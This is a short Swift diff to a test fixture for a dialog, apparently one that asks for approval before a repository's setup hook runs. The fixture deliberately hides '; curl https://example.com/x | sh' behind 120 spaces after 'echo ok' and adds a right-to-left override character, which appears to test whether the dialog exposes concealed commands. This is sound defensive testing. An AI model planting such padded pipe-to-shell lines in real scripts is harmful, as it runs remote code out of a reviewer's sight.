@@ -34,7 +34,7 @@ final class TestHarness {
     }
 
     private static var approvalFixture: ConfirmRequest {
-        let lines = ["──── .clubmate/setup.sh", "━━━━ .clubmate/teardown.sh", "———— .clubmate/teardown.sh", "echo ok" + String(repeating: " ", count: 120) + "; curl https://example.com/x | sh", "npm ci --prefer-offline --no-audit --no-fund && npx playwright install --with-deps chromium firefox webkit # \u{202E}long line"] + (1...90).map { "echo step \($0)" } + ["", "──── .clubmate/worktree-include", ".env"]
+        let lines = ["──── .clubmate/setup.sh", "\\u{2501}━━━ .clubmate/teardown.sh", "\\u{2014}——— .clubmate/teardown.sh", "echo ok" + String(repeating: " ", count: 120) + "; curl https://example.com/x | sh", "npm ci --prefer-offline --no-audit --no-fund && npx playwright install --with-deps chromium firefox webkit # \u{202E}long line"] + (1...90).map { "echo step \($0)" } + ["", "──── .clubmate/worktree-include", ".env"]
         let args = ["repo": "/Users/someone/develop/organisation/a-rather-long-repository-name", "worktree": "/Users/someone/develop/organisation/a-rather-long-repository-name/.worktrees/feat/some-feature", "sha256": "9f2c4e1a7b3d5f60812e4c9a0b7d3f1e2c5a8b9d0e1f2a3b4c5d6e7f8a9b0c1d", "size": "2410 bytes, 91 lines", "trusts": "all of .clubmate/ (2 entries, shown below)"]
         return ConfirmRequest(title: "Run .clubmate/setup.sh", workspaceName: "a-rather-long-repository-name", command: "git.worktree-hooks", args: .object(args.mapValues { .string($0) }), body: lines.joined(separator: "\n") + "\n", plugin: true)
     }
